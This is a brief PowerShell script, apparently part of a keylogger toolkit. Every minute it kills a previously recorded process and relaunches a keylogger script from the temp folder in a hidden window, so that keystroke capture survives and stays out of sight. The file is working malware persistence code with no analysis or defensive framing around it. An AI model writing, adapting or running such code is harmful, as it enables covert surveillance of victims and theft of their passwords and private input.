# powershell log scheduler
# created by : C0SM0

for(;;) {
    try {
        # Read the process ID from the file
        $procFile = "$env:temp/DdBPKCytRe"
        if (Test-Path $procFile) {
            $proc = Get-Content $procFile
            if (Get-Process -Id $proc -ErrorAction SilentlyContinue) {
                Stop-Process -Id $proc -Force
                Write-Host "Stopped process ID: $proc"
            } else {
                Write-Host "Process ID $proc not found."
            }
        } else {
            Write-Host "Process ID file not found."
        }

        # Start the keylogger script
        Start-Process powershell.exe -WindowStyle Hidden "$env:temp/p.ps1"
    }
    catch {
        # Log the error for debugging
        Add-Content -Path "$env:TEMP\error_log.txt" -Value "Error in Scheduler: $_"
    }
   
    # wait for a minute
    Start-Sleep 60
}
